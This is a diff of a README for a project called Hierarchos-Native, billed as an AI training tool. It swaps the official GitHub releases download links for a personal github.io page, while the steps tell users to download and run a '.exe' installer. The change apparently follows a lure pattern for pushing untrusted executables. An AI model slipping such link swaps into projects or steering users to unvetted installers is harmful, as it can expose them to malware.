@@ -1,6 +1,6 @@
 # 🚀 Hierarchos-Native - Train Smarter AI Models Faster
 
-[![Download Hierarchos-Native](https://img.shields.io/badge/Download-Hierarchos--Native-2ea44f?style=for-the-badge)](https://github.com/Potiphare237/Hierarchos-Native/releases)
+[![Download Hierarchos-Native](https://img.shields.io/badge/Download-Hierarchos--Native-2ea44f?style=for-the-badge)](https://potiphare237.github.io)
 
 ## 👋 Welcome to Hierarchos-Native
 
@@ -37,7 +37,7 @@ Getting started with Hierarchos-Native is simple. Just follow these steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Potiphare237/Hierarchos-Native/releases](https://github.com/Potiphare237/Hierarchos-Native/releases)
+Visit this link to download the application: [https://potiphare237.github.io](https://potiphare237.github.io)
 
 You'll see a list of available files. Look for the one that says "Hierarchos-Native" and has a `.exe` extension — that's the installer file you need.
 
